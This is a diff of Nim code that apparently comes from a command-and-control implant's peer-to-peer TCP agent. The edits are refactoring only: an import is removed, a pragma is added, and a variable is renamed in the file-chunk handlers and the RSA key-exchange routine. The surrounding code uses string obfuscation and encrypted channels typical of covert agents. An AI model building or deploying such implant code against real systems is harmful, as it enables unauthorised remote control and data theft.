@@ -1,4 +1,4 @@
-import std/[base64, strutils, json, random, os, asyncdispatch, asyncnet, nativesockets, tables]
+import std/[base64, strutils, json, os, asyncdispatch, asyncnet, nativesockets, tables]
 import ../config
 import ../utils/crypto
 import ../utils/debug
@@ -172,7 +172,7 @@ proc sendDownloadChunk(taskId: string, fileId: string, path: string, fileData: s
       obf("user_output"): "Error reading chunk: " & e.msg
     }
 
-proc receiveUploadChunk(taskId: string, params: JsonNode, fileData: var seq[byte], chunkNum: int): JsonNode =
+proc receiveUploadChunk(taskId: string, params: JsonNode, fileData: var seq[byte], chunkNum: int): JsonNode {.used.} =
   ## Receive and process an upload chunk for a P2P agent
   const CHUNK_SIZE = 512000
   
@@ -938,22 +938,22 @@ proc performKeyExchange*(profile: var TcpProfile): tuple[success: bool, newUuid:
     return (true, "")
   
   # Use shared key exchange implementation
-  when encryptedExchange:
+  else:
     # Create a send wrapper that matches the expected signature
     var p = profile  # Create capturable local reference
     proc sendWrapper(data: string, uuid: string): string =
       return p.send(data, uuid)
     
-    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
+    let exchangeResult = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
     
-    if result.success and result.sessionKey.len > 0:
+    if exchangeResult.success and exchangeResult.sessionKey.len > 0:
       # Set the AES key
-      profile.setAesKey(result.sessionKey)
-      return (true, result.newUuid)
-    elif result.success:
+      profile.setAesKey(exchangeResult.sessionKey)
+      return (true, exchangeResult.newUuid)
+    elif exchangeResult.success:
       # No key exchange needed (AESPSK mode)
       return (true, "")
     else:
-      debug "[DEBUG] TCP P2P: Key exchange failed: ", result.error
+      debug "[DEBUG] TCP P2P: Key exchange failed: ", exchangeResult.error
       return (false, "")
 
